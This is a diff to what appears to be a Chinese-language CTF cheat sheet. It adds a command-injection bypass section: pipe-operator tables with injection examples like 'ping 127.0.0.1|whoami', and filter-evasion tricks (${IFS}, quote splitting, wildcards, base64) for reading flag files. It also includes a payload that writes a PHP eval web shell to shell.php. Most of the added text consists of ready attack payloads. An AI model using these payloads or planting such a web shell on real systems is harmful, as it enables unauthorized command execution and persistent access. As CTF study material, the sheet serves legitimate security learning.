@@ -40,9 +40,52 @@ copy /b 1.jpg+2.jpg 3 /y
 
 ```
 
-# Linux shell bypass
+# Linux/Windows shell bypass
 
 [Bypass Linux Shell Restrictions](https://mp.weixin.qq.com/s/8QTax87lorWNnOQR8p1ORQ)
+
+| windows 管道符   | Description                  | 示例                   |
+| ---------------- | ---------------------------- | ---------------------- |
+| \|               | 直接执⾏后⾯的语句。         | ping 127.0.0.1\|whoami |
+| \|\|             | 前面为假时执⾏               | ping 2 \|\| whoami     |
+| &                | 前⾯可真可假                 | ping 127.0.0.1&whoami  |
+| &&               | 前⾯只能为真                 | ping 127.0.0.1&&whoami |
+| **Linux 管道符** |                              |                        |
+| ;                | 执⾏完前⾯的语句再执⾏后⾯的 | ping 127.0.0.1;whoami  |
+| \|               | 显示后⾯语句的执⾏结果       | ping 127.0.0.1\|whoami |
+| \|\|             | 前面为假时执⾏               | ping 1\|\|whoami       |
+| &                | 前⾯可真可假                 | ping 127.0.0.1&whoami  |
+| &&               | 前⾯只能为真                 | ping 127.0.0.1&&whoami |
+
+/bin/bash 支持(新版 kali 需要切换为 bash)
+
+| symbol   | bypass       | url 中 | 示例                                                                                    |
+| -------- | ------------ | ------ | --------------------------------------------------------------------------------------- |
+| >        | ${PS2}       |        |
+| +        | ${PS4}       |        |
+| tab      | ${9}         | %09    |
+| 空格     | ${IFS}       |        | cat${IFS}/flag <br> cat${IFS}$9/flag<br> cat$IFS$9/flag                                 |
+|          | +            |        |                                                                                         |
+|          | {}           |        | {ls,-l}                                                                                 |
+|          | <            |        | cat</flag                                                                               |
+|          | url:%20, %09 |        | cat%09/flag <br>X=$'cat\x09./flag.php';$X                                               |
+| 任意字符 | ${SHELLOPTS} |        | `${SHELLOPTS:1:1}  -- r`<br>`${SHELLOPTS:3:1}  -- c`<br>`${SHELLOPTS:3:1}at -- cat`<br> |
+| 任意字符 | \            |        | c\a\t /flag                                                                             |
+| 任意字符 | \*           |        | cat f\* 　　　 cat /???/???sw? <br> ?代表⼀个字符<br> []代表范围内任意一个字符<br>      |
+| 任意字符 | base64       |        | `echo "aWQ=" \| base64 -d` -- id                                                        |
+| 任意字符 | ''           |        | c''at /flag                                                                             |
+| 任意字符 | ""           |        | c""at /flag                                                                             |
+| 任意字符 | 特殊变量@t   |        | ca$@t /flag                                                                             |
+
+`${IFS}` 对应 内部字段分隔符
+
+```sh
+127.0.0.1 &echo "<?php @eval(\$_POST['a']);?>" >> shell.php
+
+过滤"ping -c 4 {$_GET['ip']}"
+    =>|ls, |cat flag.php, 看源码,
+    注意: 使用| 这不是连续执行, 只能一级传一级,要连续就用127.0.0.1;ls
+```
 
 # Sql bypass
 
